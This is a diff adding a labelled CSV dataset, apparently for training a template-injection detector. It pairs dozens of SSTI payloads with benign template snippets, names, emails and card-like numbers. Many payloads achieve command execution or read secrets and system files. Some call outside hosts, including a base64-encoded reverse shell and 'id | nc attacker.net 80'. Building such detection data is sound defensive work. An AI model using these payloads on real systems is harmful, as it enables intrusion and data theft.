@@ -1,0 +1,582 @@
+payload,base_id,payload_length,special_char_ratio,count_double_brace,count_dollar_brace,count_hash_brace,count_percent_brace,count_erb,delimiter_family_count,max_bracket_depth,has_dunder_chain,has_exec_tokens,has_java_reflection,has_flask_objects,has_arithmetic_operation,has_string_operation,count_method_calls,count_dots,label
+{{ '7'*7 }},{{'S'*N}},11,0.636364,1,0,0,0,0,1,2,0,0,0,0,0,0,0,0,1
+"{{ ['system', 'echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMS43NS8xMjM0IDA+JjEK | base64 -d | bash'] | sort('call_user_func') }}","{{['S','S']|sort('S')}}",133,0.165414,1,0,0,0,0,1,3,0,0,0,0,0,0,0,0,1
+You age is {{60+7}} years old,youageis{{N+N}}yearsold,29,0.172414,1,0,0,0,0,1,2,0,0,0,0,1,0,0,0,1
+"{{config[""SECRET_KEY""]}}","{{config[""S""]}}",24,0.375,1,0,0,0,0,1,3,0,0,0,1,0,0,0,0,1
+{{self.__dict__}},{{self.__dict__}},17,0.529412,1,0,0,0,0,1,2,1,0,0,1,0,0,0,1,1
+{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}},{{request.application.__globals__.__builtins__.__import__('S').popen('S').read()}},84,0.380952,1,0,0,0,0,1,3,1,1,0,1,0,0,3,6,1
+{{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('id')['read']()}},{{request['S']['S']['S']['S']('S')['S']('S')['S']()}},102,0.490196,1,0,0,0,0,1,3,1,1,0,1,0,0,0,0,1
+{{request['application']['\x5f\x5fglobals\x5f\x5f']['\x5f\x5fbuiltins\x5f\x5f']['\x5f\x5fimport\x5f\x5f']('os')['popen']('id')['read']()}},{{request['S']['S']['S']['S']('S')['S']('S')['S']()}},138,0.362319,1,0,0,0,0,1,3,0,1,0,1,0,0,0,0,1
+"{{request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}}&f=%s%sclass%s%s&a=_","{{request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}}&f=%s%sclass%s%s&a=_",120,0.266667,1,0,0,0,0,1,4,0,0,0,1,0,0,0,10,1
+1{{self.__init__.__globals__.__str__()[1786:1788]}},N{{self.__init__.__globals__.__str__()[N:N]}},51,0.470588,1,0,0,0,0,1,3,1,0,0,1,0,0,1,3,1
+1{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen(self.__init__.__globals__.__str__()[1786:1788]).read()}},N{{self._templatereference__context.cycler.__init__.__globals__.os.popen(self.__init__.__globals__.__str__()[N:N]).read()}},129,0.356589,1,0,0,0,0,1,4,1,1,0,1,0,0,3,10,1
+"{{_self.env.setCache(""ftp://attacker.net:2121"")}}{{_self.env.loadTemplate(""backdoor"")}}","{{_self.env.setcache(""S"")}}{{_self.env.loadtemplate(""S"")}}",87,0.310345,2,0,0,0,0,1,3,0,0,0,0,0,0,2,5,1
+{%block X%}whoamiINTIGRITIsystem{%endblock%}{%set y=block('X')|split('INTIGRITI')%}{{[y|first]|map(y|last)|join}},{%blockx%}whoamiintigritisystem{%endblock%}{%sety=block('S')|split('S')%}{{[y|first]|map(y|last)|join}},113,0.300885,1,0,0,0,0,1,3,0,0,0,0,0,0,0,0,1
+"{{_context|keys|join(',')}}",{{_context|keys|join('S')}},27,0.444444,1,0,0,0,0,1,3,0,0,0,0,0,0,0,0,1
+{{files.get_style_sheet('../../../../../etc/passwd')}},{{files.get_style_sheet('S')}},54,0.5,1,0,0,0,0,1,3,0,0,0,0,0,0,1,11,1
+1{%block U%}id000passthru{%endblock%}{%set x=block(_charset|first)|split(000)%}{{[x|first]|map(x|last)|join}},N{%blocku%}idNpassthru{%endblock%}{%setx=block(_charset|first)|split(N)%}{{[x|first]|map(x|last)|join}},109,0.293578,1,0,0,0,0,1,3,0,0,0,0,0,0,0,0,1
+${'java.lang.ProcessBuilder'?new(['id']).start()},${'S'?new(['S']).start()},49,0.346939,0,1,0,0,0,1,3,0,1,0,0,0,0,1,3,1
+"{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,""<?php passthru($_GET['cmd']); ?>"",self::clearConfig())}","{smarty_internal_write_file::writefile($script_name,""S"",self::clearconfig())}",108,0.296296,0,0,0,0,0,0,4,0,0,0,1,0,0,0,0,1
+1{chr(105)|cat:chr(100)},N{chr(N)|cat:chr(N)},24,0.333333,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,1
+"$class.inspect(""java.lang.Runtime"").type.getRuntime().exec(""id"")","$class.inspect(""S"").type.getruntime().exec(""S"")",64,0.265625,0,0,0,0,0,0,1,0,1,0,0,0,0,3,6,1
+%><%=`whoami`,%><%=`whoami`,13,0.538462,0,0,0,0,2,1,0,0,0,0,0,0,0,0,0,1
+<%= Dir.entries('/') %>,<%=dir.entries('S')%>,23,0.478261,0,0,0,0,2,1,1,0,0,0,0,0,0,1,1,1
+${'nslookup -type=SRV 9zngatihqnif00r6i461uq.oastify.com'.execute().text},${'S'.execute().text},73,0.178082,0,1,0,0,0,1,2,0,0,0,0,0,0,1,4,1
+"1${x=new String();for(i in[105,100]){x+=((char)i).toString()};x.execute().text}","N${x=newstring();for(iin[N,N]){x+=((char)i).tostring()};x.execute().text}",79,0.35443,0,1,0,0,0,1,4,0,0,0,0,0,0,2,3,1
+"1@{string x=null;int[]l={119,104,111,97,109,105};foreach(int c in l){x+=((char)c).ToString();};}@x","N@{stringx=null;int[]l={N,N,N,N,N,N};foreach(intcinl){x+=((char)c).tostring();};}@x",98,0.326531,0,0,0,0,0,0,4,0,0,0,0,0,0,1,1,1
+"1{{passthru(implode(null,array_map(chr(99).chr(104).chr(114),[105,100])))}}","N{{passthru(implode(null,array_map(chr(N).chr(N).chr(N),[N,N])))}}",75,0.32,1,0,0,0,0,1,6,0,0,0,0,0,0,2,2,1
+{{ someString.toUPPERCASE() }},{{somestring.touppercase()}},30,0.233333,1,0,0,0,0,1,3,0,0,0,0,0,0,1,1,1
+"{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(""new java.lang.String('xxx')"")}}","{{'S'.getclass().forname('S').newinstance().getenginebyname('S').eval(""S"")}}",142,0.246479,1,0,0,0,0,1,4,0,1,1,0,0,0,6,9,1
+"{{range.constructor(""return global.process.mainModule.require('child_process').execSync('tail /etc/passwd')"")()}}","{{range.constructor(""S"")()}}",113,0.230088,1,0,0,0,0,1,4,0,0,0,0,0,0,3,5,1
+"{{range.constructor('return global.process.mainModule.require(""child_process"").execSync(""whoami"")')()}}",{{range.constructor('S')()}},103,0.23301,1,0,0,0,0,1,4,0,0,0,0,0,0,3,5,1
+"{{.Secret ""id""}}","{{.secret""S""}}",16,0.4375,1,0,0,0,0,1,2,0,0,0,0,0,0,0,1,1
+"{{.File ""/etc/passwd""}}","{{.file""S""}}",23,0.391304,1,0,0,0,0,1,2,0,0,0,0,0,0,0,1,1
+"#set($str=$class.inspect(""java.lang.String"").type)
+#set($chr=$class.inspect(""java.lang.Character"").type)
+#set($ex=$class.inspect(""java.lang.Runtime"").type.getRuntime().exec(""whoami""))
+$ex.waitFor()
+#set($out=$ex.getInputStream())
+#foreach($i in [1..$out.available()])
+$str.valueOf($chr.toChars($out.read()))
+#end","#set($str=$class.inspect(""S"").type)#set($chr=$class.inspect(""S"").type)#set($ex=$class.inspect(""S"").type.getruntime().exec(""S""))$ex.waitfor()#set($out=$ex.getinputstream())#foreach($iin[N..$out.available()])$str.valueof($chr.tochars($out.read()))#end",312,0.282051,0,0,5,0,0,1,3,0,1,0,0,0,0,11,22,1
+"<%
+import os
+x=os.popen('id').read()
+%>
+${x}",<%importosx=os.popen('S').read()%>${x},44,0.363636,0,1,0,0,2,2,1,0,1,0,0,0,0,2,2,1
+"{% set cmd = 'id' %}
+{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec(cmd).inputStream.readAllBytes() %}
+{{ (1).TYPE.forName('java.lang.String').constructors[0].newInstance(([bytes]).toArray()) }}","{%setcmd='S'%}{%setbytes=(N).type.forname('S').methods[N].invoke(null,null).exec(cmd).inputstream.readallbytes()%}{{(N).type.forname('S').constructors[N].newinstance(([bytes]).toarray())}}",234,0.269231,1,0,0,0,0,1,5,0,1,1,0,0,0,7,16,1
+"- var x = root.process
+- x = x.mainModule.require
+- x = x('child_process')
+= x.exec('id | nc attacker.net 80')",-varx=root.process-x=x.mainmodule.require-x=x('S')=x.exec('S'),110,0.2,0,0,0,0,0,0,1,0,1,0,0,0,0,1,5,1
+"{{#with ""console.log(JSON.stringify(process.env,null, 2))"" }}
+{{#with (split ""S"" 1) as |payload|}}
+{{__defineGetter__ ""undefined"" valueOf }}
+{{#with __lookupGetter__ }}
+{{__defineGetter__ ""propertyIsEnumerable"" (this.bind (this.bind 1)) }}
+{{__defineGetter__ ""undefined"" this.constructor}}
+{{#with __lookupGetter__ as |ctor| }}
+{{__defineGetter__ ""hax"" (ctor.apply ctor payload)}}
+{{{hax}}}
+{{/with}}
+{{/with}}
+{{/with}}
+{{/with}}","{{#with""S""}}{{#with(split""S""N)as|payload|}}{{__definegetter__""S""valueof}}{{#with__lookupgetter__}}{{__definegetter__""S""(this.bind(this.bindN))}}{{__definegetter__""S""this.constructor}}{{#with__lookupgetter__as|ctor|}}{{__definegetter__""S""(ctor.applyctorpayload)}}{{{hax}}}{{/with}}{{/with}}{{/with}}{{/with}}",430,0.286047,13,0,0,0,0,1,4,0,0,0,0,0,0,3,7,1
+"{% for x in ().__class__.__base__.__subclasses__() %}{% if ""warning"" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(""id"").read()}}{%endif%}{% endfor %}","{%forxin().__class__.__base__.__subclasses__()%}{%if""S""inx.__name__%}{{x()._module.__builtins__['S']('S').popen(""S"").read()}}{%endif%}{%endfor%}",173,0.433526,1,0,0,0,0,1,3,1,1,0,0,0,0,3,8,1
+"<#assign ex=""freemarker.template.utility.Execute""?new()><p>RCE: ${ ex(""whoami"") }</p>","<#assignex=""S""?new()><p>rce:${ex(""S"")}</p>",85,0.294118,0,1,0,0,1,2,2,0,0,1,0,0,0,0,3,1
+{{ self.__init__.__globals__.__builtins__['__import__']('os').popen('id').read() }},{{self.__init__.__globals__.__builtins__['S']('S').popen('S').read()}},83,0.46988,1,0,0,0,0,1,3,1,1,0,1,0,0,2,5,1
+"{% set arr = {'1':'system', '2':'foo'} %}
+{{ var_dump(grav.twig.twig_vars['config'].set('system.twig.safe_functions', arr)) }}
+{{ system('id') }}","{%setarr={'S':'S','S':'S'}%}{{var_dump(grav.twig.twig_vars['S'].set('S',arr))}}{{system('S')}}",145,0.337931,2,0,0,0,0,1,4,0,1,0,1,0,0,1,5,1
+"{{ ['curl yourhost.com','']|sort('system') }}","{{['S','S']|sort('S')}}",45,0.377778,1,0,0,0,0,1,3,0,0,0,0,0,0,0,1,1
+bdawg-{{7 * 7}},bdawg-{{N*N}},15,0.4,1,0,0,0,0,1,2,0,0,0,0,1,0,0,0,1
+"{{ env ""AWS_KEY"" }}","{{env""S""}}",19,0.368421,1,0,0,0,0,1,2,0,0,0,0,0,0,0,0,1
+"[wpml_language_switcher]
+{{ 4 * 7 }}
+[/wpml_language_switcher]",[wpml_language_switcher]{{N*N}}[/wpml_language_switcher],62,0.225806,1,0,0,0,0,1,2,0,0,0,0,1,0,0,0,1
+"@php
+  system(""id>/tmp/pwned"");
+@endphp","@phpsystem(""S"");@endphp",39,0.25641,0,0,0,0,0,0,1,0,1,0,0,0,0,0,0,1
+"<#assign ex=""freemarker.template.utility.Execute""?new()> ${ ex(url.getArgs())}","<#assignex=""S""?new()>${ex(url.getargs())}",78,0.25641,0,1,0,0,1,2,3,0,0,1,0,0,0,1,4,1
+"c/ luis braille 2, 10d","c/luisbrailleN,Nd",22,0.090909,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+ashida@gaudio.my,ashida@gaudio.my,16,0.125,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0
+18440,N,5,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+villasandino,villasandino,12,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+gentry.gast@luchalibremexicana.cat,gentry.gast@luchalibremexicana.cat,34,0.088235,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0
+sabourin,sabourin,8,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+<%= t('Quiet') %>,<%=t('S')%>,17,0.529412,0,0,0,0,2,1,1,0,0,0,0,0,0,0,0,0
+"plza. gazteluzarra, 105 7?b","plza.gazteluzarra,NN?b",27,0.111111,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0
+2492431748084200,N,16,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+ensminge,ensminge,8,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+dannies,dannies,7,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+nicforo,nicforo,7,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+#{kls},#{kls},6,0.5,0,0,1,0,0,1,1,0,0,0,0,0,0,0,0,0
+8032,N,4,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+kaidanovsky@soybueno.lt,kaidanovsky@soybueno.lt,23,0.086957,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0
+r4a8e3a,rNaNeNa,7,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+"c/ juan rabadan 27, 6?a","c/juanrabadanN,N?a",23,0.130435,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+<%= t('Failure') %>,<%=t('S')%>,19,0.473684,0,0,0,0,2,1,1,0,0,0,0,0,0,0,0,0
+"<%= ""#{process['hostname']}:#{process['pid']}"" %>","<%=""S""%>",49,0.44898,0,0,2,0,2,2,2,0,0,0,0,0,0,0,0,0
+leiding@ubuybetter.cat,leiding@ubuybetter.cat,22,0.090909,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0
+5453326584346927,N,16,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+86953454e,Ne,9,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+engh-stritzel@normatic-vending.lv,engh-stritzel@normatic-vending.lv,33,0.121212,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0
+2839,N,4,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+{{ _('An unexpected error has occurred') }},{{_('S')}},43,0.209302,1,0,0,0,0,1,3,0,0,0,0,0,0,0,0,0
+euzaine@schnapps.com.gs,euzaine@schnapps.com.gs,23,0.130435,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0
+cusell vinageras,cusellvinageras,16,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+49211,N,5,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+romeralo pers,romeralopers,13,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+alarba,alarba,6,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+49181,N,5,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+b481ndi5a,bNndiNa,9,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+{% if include_back_to_home_link|default(false) %},{%ifinclude_back_to_home_link|default(false)%},49,0.22449,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0
+vilassar de mar,vilassardemar,15,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+{{ button_css|default('btn btn-primary') }},{{button_css|default('S')}},43,0.255814,1,0,0,0,0,1,3,0,0,0,0,0,0,0,0,0
+beilul,beilul,6,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+{{ include('blog/_delete_post_confirmation.html.twig') }},{{include('S')}},57,0.245614,1,0,0,0,0,1,3,0,0,0,0,0,0,0,2,0
+"rec 64,","recN,",7,0.142857,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+8120300504791286,N,16,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+"{{ form.submit(value=_('Unfollow'), class_='btn btn-primary') }}","{{form.submit(value=_('S'),class_='S')}}",64,0.296875,1,0,0,0,0,1,4,0,0,0,0,0,0,1,1,0
+2095,N,4,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+{{ button_label|default('label.create_post'|trans) }},{{button_label|default('S'|trans)}},53,0.245283,1,0,0,0,0,1,3,0,0,0,0,0,0,0,1,0
+"pobla de montorns, la","poblademontorns,la",21,0.047619,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+kostka5@institutoandaluzdelmar.an,kostkaN@institutoandaluzdelmar.an,33,0.060606,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0
+renny,renny,5,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+43736,N,5,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+callaway.nererova@mirallesmoscardo.ca,callaway.nererova@mirallesmoscardo.ca,37,0.081081,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0
+6148,N,4,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+cowart,cowart,6,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+violette,violette,8,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+1943374801106050,N,16,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+79564193v,Nv,9,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+<%= number_with_delimiter(process['busy']) %>,<%=number_with_delimiter(process['S'])%>,45,0.288889,0,0,0,0,2,1,2,0,0,0,0,0,0,0,0,0
+61605523t,Nt,9,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+ombra,ombra,5,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+passatge arago 107,passatgearagoN,18,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+aloguer,aloguer,7,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+talmadge@movintel.uz,talmadge@movintel.uz,20,0.1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0
+enco,enco,4,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+mercantesca,mercantesca,11,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+tronchn,tronchn,7,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+phillis7,phillisN,8,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+"<% if @period == ""1h"" %>","<%if@period==""S""%>",24,0.375,0,0,0,0,2,1,0,0,0,0,0,0,0,0,0,0
+{{ _('User') }},{{_('S')}},15,0.6,1,0,0,0,0,1,3,0,0,0,0,0,0,0,0,0
+<%= t('TID') %>,<%=t('S')%>,15,0.6,0,0,0,0,2,1,1,0,0,0,0,0,0,0,0,0
+18914400m,Nm,9,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+5326624144210576,N,16,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+<%= t(label_key) %>,<%=t(label_key)%>,19,0.421053,0,0,0,0,2,1,1,0,0,0,0,0,0,0,0,0
+{{ _('Back') }},{{_('S')}},15,0.6,1,0,0,0,0,1,3,0,0,0,0,0,0,0,0,0
+18555,N,5,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+<% process.labels.each do |label| %>,<%process.labels.eachdo|label|%>,36,0.222222,0,0,0,0,2,1,0,0,0,0,0,0,0,0,2,0
+meli portugal,meliportugal,13,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+m7866,mN,5,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+#{new},#{new},6,0.5,0,0,1,0,0,1,1,0,0,0,0,0,0,0,0,0
+j804n86o,jNnNo,8,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+jacobsen,jacobsen,8,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+{% if show_confirmation|default(false) %},{%ifshow_confirmation|default(false)%},41,0.195122,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0
+50239662a,Na,9,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+<%= t(placeholder_key) %>,<%=t(placeholder_key)%>,25,0.32,0,0,0,0,2,1,1,0,0,0,0,0,0,0,0,0
+matie,matie,5,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+"de l' aliga 3,","del'aligaN,",14,0.142857,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+"<%= erb :_paging, locals: { url: ""#{root_path}busy"" } %>","<%=erb:_paging,locals:{url:""S""}%>",56,0.321429,0,0,1,0,2,2,2,0,0,0,0,0,0,0,0,0
+fala,fala,4,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+"<%= number_with_delimiter(jr.dig(""totals"", ""s""), precision: 2) %>","<%=number_with_delimiter(jr.dig(""S"",""S""),precision:N)%>",65,0.292308,0,0,0,0,2,1,2,0,0,0,0,0,0,1,1,0
+2857564208258288,N,16,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+kantorkova@salaparis.je,kantorkova@salaparis.je,23,0.086957,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0
+irizar morata,irizarmorata,13,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+torvizcn,torvizcn,8,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+13021468h,Nh,9,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+<%= thread %>,<%=thread%>,13,0.384615,0,0,0,0,2,1,0,0,0,0,0,0,0,0,0,0
+nanclares espejo,nanclaresespejo,16,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+<%= queue_names_by_capsule(process) %>,<%=queue_names_by_capsule(process)%>,38,0.263158,0,0,0,0,2,1,1,0,0,0,0,0,0,0,0,0
+<%= relative_time(work.run_at) %>,<%=relative_time(work.run_at)%>,33,0.30303,0,0,0,0,2,1,1,0,0,0,0,0,0,0,1,0
+stinton@sms24h.dk,stinton@smsNh.dk,17,0.117647,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0
+bruzar,bruzar,6,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+resquebrar,resquebrar,10,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+63188831b,Nb,9,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+<%= process['identity'] %>,<%=process['S']%>,26,0.346154,0,0,0,0,2,1,1,0,0,0,0,0,0,0,0,0
+tenuta,tenuta,6,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+olascoaga huix,olascoagahuix,14,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+<% if pollable? %>,<%ifpollable?%>,18,0.277778,0,0,0,0,2,1,0,0,0,0,0,0,0,0,0,0
+"<%= t(""NoDataFound"") %>","<%=t(""S"")%>",23,0.391304,0,0,0,0,2,1,1,0,0,0,0,0,0,0,0,0
+heidepri,heidepri,8,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+argerich tries,argerichtries,14,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+marling,marling,7,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+28045405x,Nx,9,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+d.onofri,d.onofri,8,0.125,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0
+85130664m,Nm,9,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+14140,N,5,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+{{ url_for('auth.reset_password_request') }},{{url_for('S')}},44,0.272727,1,0,0,0,0,1,3,0,0,0,1,0,0,0,1,0
+5509893161352437,N,16,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+moraine@tintaultravioleta.tr,moraine@tintaultravioleta.tr,28,0.071429,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0
+ax,ax,2,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+{{ _('Forgot Your Password?') }},{{_('S')}},32,0.3125,1,0,0,0,0,1,3,0,0,0,0,0,0,0,0,0
+7907782578566170,N,16,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+898,N,3,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+guiomar,guiomar,7,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+walliw,walliw,6,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+<%= t('Started') %>,<%=t('S')%>,19,0.473684,0,0,0,0,2,1,1,0,0,0,0,0,0,0,0,0
+suti8me9te,sutiNmeNte,10,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+${owner?.firstName + ' ' + owner?.lastName},${owner?.firstname+'S'+owner?.lastname},43,0.255814,0,1,0,0,0,1,1,0,0,0,0,0,1,0,2,0
+4761077405436088,N,16,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+50513,N,5,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+92439025r,Nr,9,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+hanspete,hanspete,8,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+75716077p,Np,9,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+<% if (state = @iterable_states[job.jid]) %>,<%if(state=@iterable_states[job.jid])%>,44,0.272727,0,0,0,0,2,1,2,0,0,0,0,0,0,0,1,0
+melchior@fruteriacartaya.vi,melchior@fruteriacartaya.vi,27,0.074074,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0
+00783778f,Nf,9,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+{{ 'label.delete_post'|trans }},{{'S'|trans}},31,0.290323,1,0,0,0,0,1,2,0,0,0,0,0,0,0,1,0
+<%= id %>,<%=id%>,9,0.555556,0,0,0,0,2,1,0,0,0,0,0,0,0,0,0,0
+mantegna-romney@underdog.tc,mantegna-romney@underdog.tc,27,0.111111,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0
+<% if job_results.any? %>,<%ifjob_results.any?%>,25,0.28,0,0,0,0,2,1,0,0,0,0,0,0,0,0,1,0
+"{{ path('blog_post', {slug: post.slug}) }}","{{path('S',{slug:post.slug})}}",42,0.333333,1,0,0,0,0,1,4,0,0,0,0,0,0,0,1,0
+nuri,nuri,4,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+zalee,zalee,5,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+{{ _('Export your posts') }},{{_('S')}},28,0.321429,1,0,0,0,0,1,3,0,0,0,0,0,0,0,0,0
+3777298102533853,N,16,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+31827013g,Ng,9,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+3ru7d6r,NruNdNr,7,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+contrapalanqun,contrapalanqun,14,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+{{ _('The administrator has been notified. Sorry for the inconvenience!') }},{{_('S')}},76,0.144737,1,0,0,0,0,1,3,0,0,0,0,0,0,0,1,0
+flo3a,floNa,5,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+4787579213279770,N,16,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+panama 128 5-b,panamaNN-b,14,0.071429,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+nettleton.hamissi@estudiodeyoga.pt,nettleton.hamissi@estudiodeyoga.pt,34,0.088235,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0
+"pasaje trigueros, 170,","pasajetrigueros,N,",22,0.090909,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+franklyn,franklyn,8,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+<% if process.embedded? %>,<%ifprocess.embedded?%>,26,0.230769,0,0,0,0,2,1,0,0,0,0,0,0,0,0,1,0
+"pl. constitucion, 61","pl.constitucion,N",20,0.1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0
+7378889316326396,N,16,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+guadalajara,guadalajara,11,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+<%= t('Stop') %>,<%=t('S')%>,16,0.5625,0,0,0,0,2,1,1,0,0,0,0,0,0,0,0,0
+4641290123831700,N,16,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+<% sorted_processes.each do |process| %>,<%sorted_processes.eachdo|process|%>,40,0.2,0,0,0,0,2,1,0,0,0,0,0,0,0,0,1,0
+<%= t('RSS') %>,<%=t('S')%>,15,0.6,0,0,0,0,2,1,1,0,0,0,0,0,0,0,0,0
+villapando torrontegui,villapandotorrontegui,22,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
